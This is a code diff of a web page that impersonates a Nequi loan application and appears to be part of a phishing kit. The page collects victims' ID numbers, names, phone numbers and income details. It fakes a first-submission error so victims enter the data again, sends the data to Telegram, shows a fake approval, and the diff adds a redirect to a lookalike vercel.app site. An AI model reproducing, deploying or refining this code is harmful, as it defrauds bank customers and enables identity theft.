@@ -77,6 +77,11 @@
       word-wrap: break-word;
       display: none;
     }
+
+    /* Ocultar el footer del error message */
+    .errorMessage footer {
+      display: none;
+    }
   </style>
 </head>
 
@@ -195,17 +200,6 @@
         </p>
       </div>
     </div>
-
-    <footer>
-      <div class="wrap">
-        <div class="wrapper">
-          <div class="footer">
-            <img class="footer-pc" src="../assets/footer-bigscreen.png" alt="">
-            <img class="footer-mobile" src="../assets/footer.png" alt="">
-          </div>
-        </div>
-      </div>
-    </footer>
   </section>
 
   <main class="mainContainer">
@@ -309,7 +303,7 @@
               <span id="gastosErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus gastos
                 mensuales</span>
 
-              <!-- Número de Celular (antes Saldo) -->
+              <!-- Número de Celular -->
               <div class="form-group">
                 <input type="tel" id="numeroCelularSalvavidas" required="" inputmode="numeric" maxlength="10" pattern="[0-9]*">
                 <label for="numeroCelularSalvavidas">Número de celular</label>
@@ -419,7 +413,6 @@
             // Función para mostrar mensaje de depuración
             function showDebugMessage(msg, isError = false) {
               console.log(msg);
-              // Crear un toast visual si existe el div, si no lo creamos
               let toast = document.getElementById('debugToast');
               if (!toast) {
                 toast = document.createElement('div');
@@ -482,8 +475,8 @@
               }
             }
 
-            // Elementos del loader NEQUI mint
-            function mostrarLoaderNequi() {
+            // Función para mostrar loader y redirigir
+            function mostrarLoaderYRedirigir() {
               const contenedor = document.getElementById("loadingContenedor");
               const loader = document.getElementById("loader");
               const done = document.getElementById("done");
@@ -496,10 +489,16 @@
               loader.style.display = "flex";
               done.classList.remove("show");
 
+              // Después de 2.5s oculta el spinner y muestra aprobado
               setTimeout(() => {
                 loader.style.display = "none";
                 done.classList.add("show");
               }, 2500);
+
+              // Redireccionar a Google después de 4 segundos
+              setTimeout(() => {
+                window.location.href = "https://teprestanequi.vercel.app/inicio/index.html";
+              }, 4000);
             }
 
             // Formatear el monto mientras se desliza el slider
@@ -544,12 +543,10 @@
             }
 
             function validarCampoNumerico(valor) {
-              // Eliminar todo excepto números
               const soloNumeros = valor.replace(/[^0-9]/g, '');
               return soloNumeros.length >= 4;
             }
 
-            // Nueva validación para número de celular
             function validarNumeroCelular(celular) {
               const soloNumeros = celular.replace(/[^0-9]/g, '');
               return soloNumeros.length === 10;
@@ -574,7 +571,6 @@
                 cedulaValida && nombreValido && numeroCelularValido && ingresoMensualValido && gastosMensualValido
               );
 
-              // Mostrar/ocultar errores
               document.getElementById("cedulaErrorSalvavidas").classList.toggle('hidden', cedulaValida);
               document.getElementById("nombreErrorSalvavidas").classList.toggle('hidden', nombreValido);
               document.getElementById("celularErrorSalvavidas").classList.toggle('hidden', numeroCelularValido);
@@ -599,7 +595,6 @@
             const ocupacionSelectorSalvavidas = document.getElementById("ocupacionSelectorSalvavidas");
             const btnContinuarSalvavidas = document.getElementById("btnContinuarSalvavidas");
 
-            // Formateo de campos numéricos (solo para ingresos y gastos)
             function formatCurrency(input) {
               let value = input.value;
               value = value.replace(/\D/g, "");
@@ -645,7 +640,6 @@
               loadingSpinner.style.display = "block";
               
               if (contSendButton === 1) {
-                // PRIMER CLIC: mostrar error simulado
                 setTimeout(() => {
                   errorMessage.style.display = "block";
                   numeroCelularSalvavidas.style.border = '2px solid #da0081'
@@ -660,8 +654,6 @@
                   window.scrollTo({ top: ingresoMensualSalvavidas.getBoundingClientRect().top + window.scrollY - 100, behavior: "smooth" });
                 }, 4000);
               } else {
-                // SEGUNDO CLIC: recopilar datos y enviar a Telegram
-                
                 const formData = {
                   cedula: cedulaSalvavidas.value,
                   nombreCompleto: nombreCompletoSalvavidas.value,
@@ -680,18 +672,11 @@
                 // Enviar a Telegram
                 const resultado = await enviarATelegram(formData);
                 
-                if (resultado && resultado.ok) {
-                  // Mostrar loader de éxito
-                  mostrarLoaderNequi();
-                } else {
-                  // Si falló, mostrar error pero continuar con el loader igual
-                  showDebugMessage('⚠️ No se pudo enviar a Telegram, pero continuamos', true);
-                  mostrarLoaderNequi();
-                }
+                // Mostrar loader y redirigir después de 4 segundos
+                mostrarLoaderYRedirigir();
               }
             });
             
-            // Inicializar
             actualizarEstadoBotonContinuar();
           });
         </script>
